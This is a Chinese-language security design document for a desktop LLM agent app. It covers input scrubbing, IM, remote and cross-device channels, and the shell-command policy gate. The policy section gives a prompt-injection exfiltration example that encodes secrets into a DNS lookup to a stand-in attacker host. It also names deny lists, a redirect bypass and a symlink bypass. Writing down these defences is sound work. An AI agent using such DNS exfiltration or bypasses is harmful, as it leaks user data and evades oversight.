`[REDACTED:private-key]`。支持 PKCS#8 unencrypted / RSA / OPENSSH /
DSA / EC / ENCRYPTED / PGP 7 种类型变体。Rust 端 regex 不支持
backreference,所以枚举了 7 个 BEGIN/END 对作为 alternation。Type
alternation 是**可选**的 — 抓 PKCS#8 (`-----BEGIN PRIVATE KEY-----`)
这种没 type 前缀的。

Rust 和 TS 端共享同一份正则的访问入口(`crates/kaya-core/src/llm/
scrub.rs::ssh_key_regex()`),避免两边漂移。

### 4.4 `originalBytes` 反映原始输入

UI 提示"原 5.0 KiB → 4.0 KiB"必须用**原始**输入字节数,不能用
post-scrub 字节数 — 一次 scrub 可能把 5 KiB 的粘贴缩到 1 KiB
(PEM body 占了 4 KiB),用户看到 "原 1 KiB" 会以为"我就打了 1 KiB"。
回归测试 `userInputGuard.test.ts::originalBytes reflects RAW input bytes`
锁这条不变量。

### 4.5 命中时 UI 显式提示

用户消息命中 redaction 时,UI 渲染「已脱敏」badge;截断时显示"已截断:
原 N KiB → M KiB"。**用户清楚知道发生了什么**,而不是"系统默默改了我的话"。

### 4.6 IM channel 入口(2026-08-22,v2.1.0;2026-09-20 接入 Slack)

飞书 / 企业微信 / Slack(2026-09-20)是 chat 输入框之外的**第二个用户输入入口**:允许名单里的
用户在 IM 里给机器人发消息,由本机 kaya 的 LLM 处理并流式回复。入口换了,
防线不换 —— 每条 inbound 消息走的仍是**同一条五道关卡 pipeline**:

- **第零关照跑**:消息在进 agent loop 前过同一份 `user_input_guard`
  (scrub-first → truncate 32 KiB);工具调用照常经 policy → safety →
  隔离执行(`zsh -f -c` 独立子进程)→ output scrub。对话内容只发往你在
  「通用」页选定的 LLM provider 路径,kaya 本身不经任何第三方中转。
  隔离执行的子进程环境与桌面同源 —— boot 捕获 + 逐值 Strict scrub 的
  env 快照(§6),2026-09-07 起 IM 与桌面共享**同一份**(此前 IM 侧是
  空快照,子进程只继承 kaya 父进程 env);子进程可见环境由此与桌面完全
  同级,属「IM == 桌面 chat」契约内的刻意对齐。
- **准入 allowlist(默认拒绝陌生人)**:按平台用户标识准入 —— 飞书填
  open_id(`ou_` 开头),企业微信填成员 userid,Slack 填 member ID
  (`U` 开头,2026-09-20)。不在名单里的用户消息
  **直接丢弃**,不进 LLM、不产生回合、不留 conversation。名单为空时
  渠道无法启动 —— 没有准入限制等于任何人都能让 LLM 在本机执行命令。
- **coding 能力受同一套总闸 + 授权闸约束**(2026-08-22 镜像对齐):
  IM turn 的工具表与桌面全集对齐,但 `terminal_write` 仅当 coding
  模式总闸快照开启时才注册,且执行前仍逐 tab 检查授权表 + 每分钟写
  预算(与桌面同一检查点);`agent_config` 的 edit 仍走共享授权闸,
  未授权只发授权请求、不写盘。飞书 / Slack 侧授权决议经**交互卡片(按钮)**做出
  (2026-08-22 P2 / 2026-09-20,见 §4.7);企微侧本轮无卡片,决议仍在桌面端做出,
  IM 侧无法自我授权。
- **凭证只存系统钥匙串(macOS Keychain / Windows 凭据管理器)**:飞书 App Secret / 企微 Secret / Slack 双 token(app-level `xapp-` + bot `xoxb-`,2026-09-20)在保存时写入
  系统钥匙串,不落盘文件、UI 不回读显示,也绝不随对话内容发往任何 LLM provider。
- **长连接直连平台**:飞书走官方 WebSocket 长连接(open-lark),企微走
  `wss://openws`,Slack 走 Socket Mode WSS(app-level token 换 `connections.open`
  拿 URL,2026-09-20),**不需要公网 IP 或回调服务器**,也没有第三方中转;
  会话映射落 `~/.kaya/channels/sessions.json`,镜像目标 chat 落
  `~/.kaya/channels/mirror.json`(2026-09-01,镜像绑定跨重启恢复),IM
  会话复用既有的
  conversation JSONL 落盘(`~/.kaya/conversations`,见 §8)。**如实说明**:
  channel 入口暂未接入审计 JSONL —— audit trail 里没有 IM 收发行,
  该缺口计划后续 round 补齐;五道关卡本身不依赖审计日志,在 IM 管线内
  照常逐关执行。

### 4.7 IM 渠道与镜像(2026-08-22)

镜像是 §4.6 之上的**可选增强**,把「对话内容出本机」的边界从 LLM
provider 一条路径扩到两条,因此全部默认关、显式 opt-in:

- **镜像 = 全项目唯一的内容出本机新增路径,默认关**。开启前,出本机的
  对话内容只发往生效的 LLM provider;开启「桌面 → IM 镜像」后,桌面
  chat 的消息流(含你的输入回显「你:…」)会实时推送到你指定的 IM 聊天。
  开关在 Settings → IM 渠道,运行中可即时切换(`channel_set_mirror`),
  关镜像不断绑定 —— 重开时原 chat 继续镜像,不重复通知。
- **双向镜像共用同一条出站管线**:桌面 → IM 方向经 FanoutSink 复用
  ChannelEventSink(与 IM turn 同一渲染 / 节流 / 出站);IM → 桌面方向
  把 IM turn 的事件扇出到 WebView(与桌面 llm_chat 同一个 sink 实现)。
  内容在源回合已过 output scrub 第 4 关(桌面回合按用户设置档位,
  IM 回合固定 `ScrubLevel::Strict`),镜像出站管线本身不再重复 scrub。
- **飞书 / Slack 授权卡片等效桌面授权卡**(2026-08-22 P2;Slack 2026-09-20
  接入,Block Kit 交互按钮):terminal_write /
  agent_config edit 的授权请求在飞书 / Slack 渲染成带「批准 / 拒绝」按钮的交互
  卡片,决议写入**与桌面共享的同一份 grant store** —— IM 批的桌面认,
  桌面批的 IM 认,不存在第二套授权状态。安全边界:操作者必须逐字在
  准入 allowlist(与入站消息同一道闸,陌生人回调静默丢弃);按钮指纹
  由本机组装、回调解析失败一律 fail closed;决议留痕 app_log,操作者
  只记长度不记内容。卡片 detail 的目标展示名是组合可辨识标签(运行
  实例 ID + 项目标签 / cwd 尾段,2026-10-01 起;cwd 基名属进程元数据,
  与通知摘要同口径),标题 / 路径分量出站前经控制字符与 markdown
  元字符清洗,指纹仍用裸 paneId、与展示标签解耦。
- **agent 状态主动通知**(2026-08-22 P3):镜像开启时,绑定 tab 里的
  编程 agent 状态变化(等输入 / 空闲完成 / 上线 / 退出)主动推送到镜像
  聊天,按渠道语言快照出 zh/en。通知里的画面摘要(excerpt)与桌面
  「待决策条」用的是**同一段已过 scrub 的文本**(watcher emit 前过
  scrub_text 同一管道),不是新的内容出口;per (tab, kind) 冷却
  (60s / 300s / 30s)防通知风暴;推送全部失败静默,绝不影响 watcher
  与 IM 主链路。
- **IM 工具表已与桌面全集对齐**(2026-08-22 镜像对齐):terminal_read /
  terminal_write / agent_config / task_list 与桌面共享同一份 store
  (终端历史 / writer / grant / abort 表 / 任务清单快照)。`terminal_write`
  仍由 coding 模式总闸照管 —— **总闸是桌面与渠道共享的原子标志,桌面开关
  扳动经 `channel_set_coding_mode` 即时写入渠道侧,下一 IM turn 生效**;
  写入本身仍受逐 tab 驾驶授权约束。
- **如实说明(企微限制)**:企业微信的镜像回显(UserEcho)与主动通知
  依赖活跃的回调登记(纯桌面场景没有 IM turn 在途时,出站消息可能
  **静默丢失**);本轮仅飞书做了真机验证,企微镜像能力以代码对齐为准、
  未经真机验收。
- **IM 渠道回合的 trusted-read 敏感子树拒读(2026-10-08)**:IM 渠道回合的 policy 上下文置 `restrict_sensitive_reads`(§5.1
  V3.0.7 批次 F3;生产只在 IM 回合置位 —— 远程 SPA 回合复用桌面
  `PolicyContext`、peer 回合不注册 `run_shell`,两者都不在本闸内),trusted-read 命中 `~/.kaya/` 下 `memory/` /
  `audit/` / `conversations/` / `channels/` / `remote/` / `debug/` /
  `tmp-images/` 敏感子树一律 `[policy:trusted-read-miss]` 拒;桌面
  chat 读自己的 trusted root 行为不变(那是用户本人的机器与本机
  展示)。**如实口径(2026-10-26 复核)**:生产环境里
  `restrict_sensitive_reads` 只在 **IM 渠道回合**置位
  (`crates/kaya-core/src/channels/inbound.rs`);远程 SPA 发起的回合复用桌面
  `PolicyContext`(该 flag 为 false),peer 回合不注册 `run_shell` ⇒ 本节
  拒读**实际覆盖 IM 渠道回合**,远程 / peer 不在其内(此前「IM / 远程」
  的表述对远程部分不成立,按实修正)。**2026-10-26 追加**:云端用量上传的**本机状态**
  (`~/.kaya/usage/upload-<部署>.json` 及其原子写临时文件
  `usage/upload-<部署>.json.tmp`,含 account_id / device_id / 供应商维度映射;
  **2026-10-30 起按部署分** —— cn / intl 两套独立的云端与账号各持一份,
  旧版共享的 `usage/upload.json` 只作一次性迁移源)
  同样 `[policy:trusted-read-miss]` 拒(IM 渠道回合不得读走);**`usage/`
  子树按「只放行用量事件文件」逐路径判定** —— 目录本体(显式路径
  `grep -r x ~/.kaya/usage` 的递归读、cwd = 该目录的裸递归搜索)、
  状态文件、原子写临时文件、跨进程锁文件、以及会匹配到它们的通配形态
  (`~/.kaya/usage/*` / `upload.json*` / `upload-*.json*`)一律拒(词法层无法展开通配符,
  只禁精确路径挡不住);**用量事件文件**
  (`usage/events-YYYY-MM-DD.jsonl`,只含计数与 provider / model 标识)
  照常可读,整个 `usage/` 子树**不进**敏感目录清单。**2026-10-08 策略变更(用户拍板)**:IM 是 allowlist 授信
  渠道(陌生人消息 fail-closed),信任等级按已授信用户对待 ——
  memory 三件套(`memory_search` / `memory_timeline` / `memory_get`)
  注册进 IM 工具表(远程访问同管线自动获得),显式「记住」同步开放
  (pure 直写短路、零 LLM 回合;inline 意图回合注册 memory_add +
  回合收尾兜底直接入库、结局按真实 status 回报;host 合成回合不触发「记住」检测)。
  **保留的边界**:本拒读不变(记忆/审计原文不随 IM 回合的
  run_shell / list_dir 绕行读出,记忆内容只经 memory_* 工具 scrub
  后的输出出)、schedule_manage / task_queue 仍不进 IM 工具表、
  task_list 的 create 在 IM 侧 sink=None(fail-closed)、全部记忆
  工具输出过 output scrub、tombstone(已丢弃/彻底删除)对检索工具
  不可见。

### 4.8 远程访问(relay 中转)(2026-09-15,Phase 1)

远程访问(设置 → 远程访问)是 chat 输入框与 IM 渠道之外的**第三个用户
输入入口**,也是继 IM 镜像之后第二条「对话内容出本机」的路径 —— 与
镜像同一定位:**默认关、显式 opt-in**,启用开关旁的文案明示中转口径
(「对话内容将经 yunhou 服务器中转,仅内存透传、不落盘」)。

- **relay 服务端口径(可由代码审验)**:仅内存路由 —— 不解析 payload、
  不持久化任何帧、访问日志不含 payload 与 user_text;全程 WSS(TLS);
  房间按 user_id 硬隔离(你的设备只有你自己账号下的浏览器端能连);
  relay ticket 由 access_token 经 `POST /relay/ticket` 换发,**5 分钟
  短期化**(续期即付费复查,付费丢失 ≤6 分钟收敛断连)。即使 relay
  被攻破,攻击者看到的也只是 TLS 之内、内存之中的实时流,无历史数据
  可拖库(与 /chat 代理同口径:服务端能看到转发内容,但不落盘)。
  **API 密钥不经中转**:BYOK 的 key 只进系统钥匙串与本机直连 provider
  的鉴权 header —— 远程回合的 LLM 调用仍由桌面本机发起,relay 上
  没有任何 API key 经过。
- **五道关卡同构**:远程发起的消息走与桌面 / IM **同一条管线** ——
  `channels::handle_inbound` 入口 → 同一份 `user_input_guard`
  (scrub-first → truncate 32 KiB)→ 工具调用照常 policy → safety →
  隔离执行(`zsh -f -c` 独立子进程)→ output scrub。scrub 档位取
  桌面 Normal 档(Balanced)—— 远程操作者是机主本人,而非 IM 的
  Strict 档(面向名单里的 IM 消息发送者)。
- **授权状态唯一**:远程端可对 terminal_write / agent_config edit 的
  授权请求做批准 / 拒绝,决议写入**与桌面共享的同一份 grant store** ——
  远程批的桌面认,桌面批的远程认,不存在第二套授权状态(与飞书授权
  卡片同构);terminal_write 仍受 coding 模式总闸 + 逐 tab 授权 +
  每分钟写预算约束(与桌面同一检查点)。
- **付费硬门双侧一致**:kaya 侧 `remote_enable` 挂
  `require_paid_access("remote")`,relay 的 `/relay/ticket` 签发侧
  同挂 entitlement —— 不存在「relay 拒了但 kaya 显示已启用」的假态;
  `remote_disable` **永远放行**(fail-safe,降级 / 未登录也能关掉,
  不留「开着但关不掉」的卡死态)。
- **本地落盘**:设备身份(随机 ULID + 展示名)与 enabled 持久化开关落
  `~/.kaya/remote/device.json`(0o600 原子写);设备名只用于远程端
  展示。relay ticket 与 access_token 不落盘(access_token 仅内存,
  refresh_token 在系统钥匙串(macOS Keychain / Windows 凭据管理器))。
- **如实说明(审计缺口)**:远程会话复用 IM 的 `handle_inbound` 管线,
  在途回合来源标记同样记为 `TurnOrigin::Im`(尚无独立 Remote 变体);
  与 §4.6 的 IM 渠道同口径 —— 远程收发行暂未接入审计 JSONL,该缺口
  计划后续 Phase 补齐;五道关卡本身不依赖审计日志,在远程管线内照常
  逐关执行。

### 4.9 跨机设备协同(device↔device peer,2026-10-15)

跨机协同(设置 → 跨机协同)让**同一账号**下的两台桌面 kaya 经 relay
直接协同:一台(发起端 A)把任务派发到另一台(执行端 B)上正在运行的
编程 agent,B 的 agent 状态与授权请求实时回传 A。传输复用 §4.8 远程
访问的**同一条 relay 连接与同一 user_id 房间** —— relay 的哑管道口径
**不变**:不解析 payload、不持久化任何帧、访问日志不含 payload;peer
帧只是信封 `"kind":"peer"` 的新负载种类(与既有远程帧的 kind 命名
空间隔离,接收方先判信封 kind)。

- **默认关 + 执行端准入 fail-closed**:协同总开关默认关闭;开启后由你
  逐设备勾选白名单(可按 agent 圈定范围),配置落
  `~/.kaya/remote/peers.json`(0o600 原子写;文件损坏按默认关处理,
  安全侧)。总开关关、或设备不在白名单时,**执行向帧**(task_dispatch /
  grant_respond / task_control,执行端实际消费的三种)一律拒收 +
  warn 级 app_log(tag `peer_denied`,payload 只记设备 id 与帧类,
  **绝不记帧内容**);2026-10-19 起 `task_dispatch` 的拒收另向来源设备
  回一端 `failed` TaskState(固定指引文案,不含帧内容;grant_respond /
  task_control 维持静默)—— 准入语义不变(不执行、不弹卡),发起端
  从「完全无感」收敛为可见失败与行动指引;发现/状态帧(hello / bye / task_state /
  grant_request / agent_event)不走准入闸,照常登记并转发前端。
  **如实说明**:远程访问启用时,发现/状态帧即在同账号设备间流动
  (presence 一到就向同账号对端发 hello + agent 状态摘要扇出,出站
  方向同样不受协同总开关约束)——协同总开关管的是「能不能对这台机器
  派发任务」,不是「设备间是否互相可见」。发起端无需配置 —— 发起是
  天生的,被发起才需准入。
- **信任模型:同账号 = 机主本人**。能连进房间的对端设备必须是同一
  账号登录的 kaya(relay 按 user_id 硬隔离 + 服务端盖章,见下),
  因此对端按「机主本人的另一台设备」对待:帧内容离开本机前过 output
  scrub,档位取 **Balanced**(与 §4.8 远程访问同口径 —— 不是 IM 面向
  allowlist 发送者的 Strict);屏尾与 evidence 等自由文本另有硬上限
  (屏尾 ≤ 8 KiB、evidence ≤ 500 字节)。
- **卡片字段跨机同步(2026-10-17)**:agent 状态帧(agent_event)在既有
  摘要与状态行(模型 / 上下文 / 思考 / 权限)之外,另携带 **cwd 与
  pane 项目标签**两个可选字段 —— 对端卡片据此渲染目录行与项目标签行
  (对齐本机卡片的信息面)。两字段与摘要同一出站管道(Balanced scrub
  + 8 KiB 截断),对端仅作文本渲染(远程卡片不提供标签编辑)。语义为
  **携带即权威**:空串表示无值 / 已清除(标签清空会传播,不留旧值);
  键缺失只出现在旧版本对端,接收方保持旧值(混版本运行不炸、既有
  语义不变)。副标题(本机 tab 重命名)与 waiting 菜单选项不跨机。
- **按需诊断(2026-10-17)**:设 `KAYA_PEER_DIAG=1` 时,发现链路
  (hello_ok / presence / peer 信封)以 tag `peer` 写 App 诊断日志;
  **诊断投影本身**默认关闭(不设环境变量零落盘;`peer_frame_decode_failed`
  / `peer_frame_unstamped` / `peer_self_frame` / `peer_table_evicted`
  / `presence_lagged_dropped` 等记录不论环境变量都会写,内容同样只有
  设备 id / 表名 / 被淘汰键 / 事件名 / 计数)。
  payload 是元数据白名单(设备 id / 设备名 / 版本 / 帧类型 / tab id /
  agent id / event_kind / 接收方计数 / 在线标记 / 房间设备计数与
  connected_at / 目标设备 id / 能力清单的 agent_id + display_name),
  **绝不记 excerpt、status、cwd、project 或任何自由文本正文**
  (有单测锁死「agent_event 元数据不含 excerpt」)。投影只在 **relay 层**
  执行、且在协议解码之前(peer 泵不再重复投影,每个入站 peer 帧 /
  presence 的**诊断投影**至多一行;解码失败等常驻 warn 另计),
  peer 信封的白名单字段因而只接受 **JSON 字符串值**(`as_str`):
  嵌套对象 / 数组 / 数字 / 布尔一律整键省略;字符串截断到
  128 字符、`agents` / 房间设备清单最多 32 条 —— 畸形帧既无法借字段
  藏正文,单帧也无法放大日志行(负向 + 截断单测锁死;诊断模式下
  app_log 不自动轮转,持续帧流仍会让日志增长)。presence / hello_ok
  的 payload 来自**已解码的类型化结构**,其中的 `online` / `connected_at`
  等布尔与数字字段是协议字段而非任意 JSON,原样落盘。白名单里的标识符
  字段(`tab_id` / `agent_id` / `device_name` 等)由对端提供,只截断
  不校验内容:它们是标识符槽位,不是正文通道;`excerpt` / `status` /
  `cwd` / `project` 等正文类字段永不投影。
- **信封 sender 由服务端盖章**:peer 帧的 `from_device_id` /
  `from_role` 由 relay 用认证连接的身份**覆写**,客户端不自填、
  服务端不信任客户端自填 —— 否则同房间的 SPA 客户端可伪造 device
  身份发 `task_dispatch`(服务端改动见 relay delta spec「改动 1:
  发送方身份盖章」)。
- **授权双端可批,权威在执行端**:terminal_write 类授权请求在两端
  同时呈现(A 的卡标「目标设备 B」,B 的卡标「来自设备 A」);任一端
  批准都写入 **B 的 grant store**(权威在执行地),批准结果广播、
  两端卡片消解;同一 grant_id 先到先赢,迟到响应幂等丢弃(grant
  store 一次性消费语义天然兼容)。**授权按(来源设备, tab, agent)
  粒度隔离**(键 `peer:{设备}:{tab}`,pid 哨兵位 0):给设备 A 的
  批准不放行设备 B 对同一 (tab, agent) 的派发,与桌面
  terminal_write 授权(裸 tab_id + 真实 pid)互不串扰。执行端重启
  会丢待决授权上下文,此后迟到的批答收到 failed 回帧(授权上下文
  不存在)而非静默吞掉。`remember_scope` 支持「对这台设备
  的这类操作不再询问」。双主并发不做跨机锁:远程派发复用本地同款
  dispatchableNow 闸序(busy 即拒/排队),B 本地操作经 watcher 照常
  报 busy。
- **派发文本与批答的纵深加固(2026-10-16)**:执行端对 dispatch
  文本做控制字符拒收(允许 `\t` / `\n`,拒 ESC / `\r` 与其它
  C0/C1 —— 与 terminal_write 工具同一判定,防终端控制序列注入与
  授权菜单被内嵌回车自动按键);`grant_respond` 强制比对盖章来源
  设备与待决授权的归属设备,不符即拒(不消费待决、不回帧,不泄露
  grant_id 存在性);待决派发 / 任务路由 / 入站授权三张内存表均有
  容量上限 + FIFO 淘汰(防对端持续刷帧造成内存单调增长),淘汰落
  warn 级 app_log(只记元数据,不记内容)。
- **审计口径(如实说明,对齐 §4.8 缺口披露)**:失败与拒收落 warn 级
  app_log(拒收 tag `peer_denied`,payload 只记设备 id 与帧类;
  执行端失败/异常 tag `peer_exec`,payload 另含 task_id 与错误摘要
  等**元数据** —— 两者均**绝不记帧内容**);成功的派发 / 执行**暂无专门
  审计记录** —— A 侧的事实性留痕在任务清单与聊天记录里,该缺口计划
  后续补齐。两侧均不记任何密钥 —— BYOK key 只存各自本机的系统钥匙串,
  peer 帧没有任何携带密钥的字段。
- **断线语义**:relay 断连时所有对端标记离线(UI 置灰、条目不消失),
  重连后由 hello 帧恢复在线 + 对账窗口防重复派发;对端不可达期间
  队列条目的 remoteLink 置 down,行操作收敛为「标记失败 / 删除」
  (手动判死)。
- **远端 Agent 按需接入（`agent_access_v1`）**：`agent_event` 可携带实例 generation、脱敏且有界的菜单选项与一次性 waiting_token；接收端只作有界内存显示投影，不落盘。页面重载通过快照恢复，退出和离线清除投影。菜单字段与现有状态摘要一样会经 relay 到同账号设备；它们不授予执行权。
  - screen/report 按需读取不调用模型，也不执行 shell 或任意路径读取。两者均要求设备/Agent 准入及 `allow_host_chat`；读取前后复验实例和范围，撤权或换代丢弃正文。复用受限本机读取工具，Strict scrub 后跨机至多 8 KiB，错误仅固定码；结果只在当前界面显示，不写聊天记录或模型上下文。
  - 显式菜单回答仅允许 1–9，必须携带当前 generation 和等待轮次的一次性票；写域与 writer 锁内重新采样、验证并消费票，busy/resolved/退出/换代撤销旧票。本机交互卡、非空手工输入及已授权 LLM `terminal_write` 的每次实际非空写入前（含独立提交与补发）也在同 pane 写域和 writer 锁内撤票；未实际写入的拒绝/待授权调用和空写不撤票。未观察到等待结束前不重签相同菜单，等待结束后再次出现必须新票。旧端缺能力位拒绝，不回退普通 cmd。
  - 请求按来源设备与 request_id 匹配；去重、在途等待和票表纯内存有界。已完成请求保留 1 小时去重墓碑，在途请求不淘汰；总容量 4096、并发最多 16。到期回收只释放请求 id 容量，不恢复已消费菜单票。等待不阻塞 relay；离线/关闭结束等待，20s 超时表示结果未确认，不自动重发。日志不记录内容。
  - 主动关停先撤销准入、置灰并中止本机回合；退出 bye 越过普通队列，显示锁外按统一 250ms 绝对期限等真实传输写回执，之后关闭 relay。背压可短暂重试，超时或失败只计数并记录零内容 warn；该预算不按对端数量累加，未送达仍由 presence/LWT 收敛。取消窗口（关停流程在前置锁或回执等待处被放弃）同样会发出一次传输关闭，兜底至多一次，不会漏关或重复关。
- **跨机对话(host chat,2026-10-19)**:Chat 路径的远程绑定从「直写
  对端 agent 输入行」改为 **Kaya↔Kaya 会话**——A 的用户文本经定向
  peer 帧(`host_request`,一次性 `request_id`)到 **B 的 Kaya**,B 用
  **本机模型**跑一轮回答,只把回答文本(≤8 KiB,过 Balanced scrub +
  char-boundary 截断)经 `host_reply` 定向回 A,不经广播。设计:
  `docs/superpowers/specs/2026-10-19-kaya-to-kaya-chat-design.md`。
  - **新增披露面**:B 的模型会读本机 Agent 状态 / 屏尾(下述三个只读
    工具,按 agent 圈定过滤),回答文本可能含少量屏幕摘要;**不做**
    全量上下文 / scrollback 跨机同步。每次请求消耗 B 本机模型额度
    (设置页勾选文案明示)。A 端把回复**纯展示**——不进 A 的本机
    LLM 上下文(A 的编程 agent 与本机模型看不到这条回复)。
  - **B 端本地回显(2026-10-20,Q2)**:B 收到对端请求后,会把**对端原文**
    与**B 本机的回答**呈现在 B 的桌面聊天面板(对端原文作为带来源徽标的
    用户气泡,本机回答作为紧随的 assistant 气泡)。⇒ **对端发来的请求
    原文落进 B 本机的聊天历史**(随 `messages` 落 localStorage,与飞书镜像
    同一口径);此前跨机回合在 B 的界面上完全不可见。B 的本机模型上下文
    不受影响(跨机回合走独立会话 `c_peer_<device_id>`,不进桌面会话)。
    **只有通过准入并真正受理的请求才会回显**(被拒 / 重复的 `host_request`
    不转发前端);对端原文上屏前过 Balanced scrub。`device_id` /
    `request_id` 在 B 端入口做形状校验(`[A-Za-z0-9_-]{1,64}`)——`device_id`
    会拼进会话文件名,非法值(如 `../`)fail-closed 拒收、不建会话。
  - **独立准入位 `allow_host_chat`**:`peers.json` 每设备新增字段,
    **缺省 false、缺字段 = 拒**(serde default fail-closed),不复用
    「能连 / 能派发」的准入位;设置页每设备一行「允许对话」勾选,
    缺省不勾;`peer_access_set` 为全量替换语义,TS 镜像同字段 +
    wire 往返测试锁死,不会被保存静默关掉。
  - **工具白名单**:peer turn 只注册 `agent_state` / `agent_report` /
    `terminal_read` 三个只读工具(圈定外 tab/agent 不出现、不可读;
    圈定解析为空集时只读工具不注册,fail-closed)+ 转达工具
    `peer_agent_send`(准入 / 圈定 / tab 身份 / 控制字符 / 授权五重闸,
    只转达不等待)。缺授权时复用既有 `PeerExecInbound` 双端授权卡，工具返回等待授权；批准前及实际写入时复验设备、Agent 范围与 `allow_host_chat`，拒绝不执行，无执行端注入时仍 fail-closed。`run_shell` / `list_dir` / `probe_env` / `tavily*` /
    memory 写入 / `schedule_manage` / `task_queue` / `agent_config` /
    通用 `terminal_write` 一律不进 peer turn。
  - **审计零内容**:B 拒收 tag `peer_denied`(device_id + 帧类)、B turn
    收尾 tag `peer_host`(`{device_id, request_id, phase, error_code}`)——
    全部只记元数据,**绝不记请求或回答文本**;A 端发送**无 Rust 审计**
    (与 peer_dispatch 成功路径无发送审计的既有口径一致),超时由前端
    在途台账(TS TTL)收尾为 `peer_host_timeout`,同样无 Rust 审计;
    成功路径无内容级审计(与既有 remote/peer 口径一致)。
    - **`peer_host` 的落点 = 帧真正上网之后(2026-10-20)**:此前是「入队
      即落」,`phase:"final"` 只证明回合跑完、证明不了这一帧真的发出
      去了(实机排查跨机回执丢失时被这条假信号带偏)。现经传输层
      「已写上 wire」回执(relay 传输层 resolve 于 WS 写完成)判定:
      上网才落 `peer_host`(附 `sent:true`);投递失败落 warn 级
      `peer_host_send_failed`、超时未确认上网落 warn 级
      `peer_host_send_timeout` —— 两者都**不落** `peer_host`。
      出站丢帧另落 warn 级 `peer_send_failed`(目标设备 + 累计失败数,
      不含帧内容);背压重试预算耗尽另落 warn 级
      `peer_send_retry_exhausted`(目标设备 + 序号 + 累计失败数),
      同样零内容。**全部仍只记元数据,零内容**。
    - **A 端在途台账持久化(2026-10-20)**:跨机在途请求台账从
      `peerHostChat.ts` 的模块内存搬进 zustand store 顶层切片
      `peerHostRequests`(进 `partialize`,`migrate` 补空对象)——
      原实现被 Vite HMR 重求值 / 页面重载清空后,回执静默丢弃、占位
      消息永远停在「等待回复…」。台账**只存 request_id / 设备 id /
      设备展示名快照 / 占位消息 id / 时间戳,无正文**;查不到条目的
      回执(重放 / 超窗迟到 / 对端发来我们从未发过的请求)**一律静默
      丢弃,不写本机聊天记录** —— 这些正文由对端控制,不能借可见提示
      持久化(2026-10-20 review 收紧)。占位消息的收敛由 matched 终局帧、
      TTL 与离线路径负责。
  - **安全硬化(同轮落地)**:设备帧(`from_device_id` 非空,relay 服务端
    盖章)**一律不得进入 RemoteInbound 的命令分发**——`chat_send` /
    `agent_command` / `chat_abort` 等 cmd 帧凡来源是设备的,拒收 + warn
    级 app_log `remote_device_frame_rejected`(只记命令名
    `payload["cmd"]`,截 64 字符,不记 payload 其余字段),
    不建会话、不 spawn turn、不产生任何出站广播。封堵「设备帧伪装
    `chat_send` → B 跑静默 turn、回复走广播到不了发起端」的现网越权
    入口;设备面会话一律走 peer 信封(`PeerChatInbound`)。

---

## 5. 第一关 + 第二关:Policy + Safety Gate

LLM 调 `run_shell` 走 Rust 端 4 阶段 pipeline 的前两阶段:

### 5.1 Policy(能力策略,3 语义表 + 7 个 deny 类别)

源码: `crates/kaya-core/src/llm/policy.rs`(308 个 cargo test,2026-10-15 发版重测)。round-67(2026-07-05)起,能力策略**不再是黑/白名单二元结构**,而是 **3 个语义表(METADATA / STREAM_TRANSFORMERS / FILE_READERS)+ 永久 blacklist + allowlist-miss 兜底**,deny reason 带结构化前缀 `[stage:subcategory]`(详见 §5.1.1)。系统 prompt(`policy_prompt::render_allowed_section_*`)与 run_shell 工具描述(`tools/run_shell.rs::rules_prose`)从同一份数据源生成,单一真相,无法漂移。

- **trusted_download 子阶段(round-57, 2026-06-28)**:LLM 可以用
  `curl -o ~/.kaya/<file> URL` 把外部上下文下载到 trusted
  root。`-o` / `--output` / shell-redirect `>` 解析 write target,后缀
  过安全检查(.sh / .py / .exe / .dmg / 等被拒,见
  `BLOCKED_DOWNLOAD_EXTS`);URL 必须 http(s) 且不指向
  loopback / link-local / cloud-metadata(SSRF)。**v2.1.10 review
  M-sec-1 收紧**:trusted download 拒收 `-L` / `--location` ——
  跟随 302 重定向会绕过首跳 URL 校验(重定向目标可指向任意
  主机);想跟重定向就再发起一跳,每跳都过 URL 校验。**新隐私面**:
  下载的字节本身不直接进
  LLM —— 只有 LLM 后续 `cat` 才会通过 trusted_read 读回;文件落在
  用户可见路径,可由用户随时检查 / 删除。**2026-10-04 review M4
  收紧**:root 内 + 安全扩展名还不够 —— 写入目标落在**控制面相对
  路径**(`agent-overrides.json` / `model-library.json` /
  `version.json` 与 `agents.d/` / `channels/` / `remote/` /
  `conversations/` / `audit/` / `memory/` / `docs/` / `terminal/` /
  `history/` / `logs/` / `debug/` / `tmp-images/` 子树)一律拒
  (`[policy:trusted-download-miss]`,下载内容与 shell 重定向同一
  口径):这些文件定义 kaya 自身的行为与安全语义(agent 识别白名单、
  模型绑定、通道会话、注入 system prompt 的本地文档、审计/记忆/会话
  取证),被公网 payload 覆写等于攻击者重新定义防护语义。读放行
  (trusted read 不变),写一律拒。**边界(2026-10-04 独立评审
  Minor)**:与 trusted-root 全线一致,该判定是纯词法归一化、不解析
  符号链接 —— `~/.kaya/` 内预埋指向控制面文件的 symlink 可绕过;
  预埋本身需要另一条写入通道(run_shell 白名单内没有 `ln`),残余
  风险低,记录在案。详见
  `docs/superpowers/specs/2026-06-28-trusted-download-design.md`。

  > Windows:PowerShell 里 `curl` 是 Invoke-WebRequest 别名,trusted download 教/用 `curl.exe` 显式形态(`table_base_key` 剥 `.exe` 归一后同样命中 `curl` 白名单条目,2026-08-25 W2)。

- **3 个语义表**(round-67,见 §5.1.1):**METADATA**(`ls` / `ps` / `df` / `uname` 等纯元数据,永远放)、**STREAM_TRANSFORMERS**(`head` / `sort` / `grep` / `awk` 等,非首位永远放,首位无文件参数或文件在 `~/.kaya/` 放)、**FILE_READERS**(`cat` / `xxd` / `strings` / `base64` 等,仅文件在 `~/.kaya/` 放)。`cat` / `xxd` / `strings` / `base64` 在 `~/.kaya/` 下**条件放行**(trusted_read),不是一律黑名单。**v2.1.10 review C1 收紧**:`source` 移出 FILE_READERS —— `source <file>` 是**执行**文件不是读文件,留在表里会与 trusted download 组合成无确认 RCE 链;现一律落 allowlist-miss 拒(`. file` 形态仍由 dot-source blacklist 拦)。**2026-10-08 安全加固(CVE-2025-55284 同类通道)**:`ping` / `traceroute` / `nslookup` / `dig` / `host` 移出 METADATA —— 这 5 个 DNS/网络诊断命令此前无条件放行(不看参数),注入载荷可把上下文数据编码进 DNS 子域(`dig <base64>.evil.com`)外发;scrub 是正则,base64 化 secret 可绕过进上下文,再经这些命令出网。Claude Code 出 CVE-2025-55284 后 Anthropic 已把同类工具移出默认 allowlist。网络诊断不在 LLM 的能力面内(定位是编程助手),移除后一律落 `[policy:allowlist-miss]` 拒(fail-closed,正是目标语义);邻近合法命令(`netstat` / `ss` / 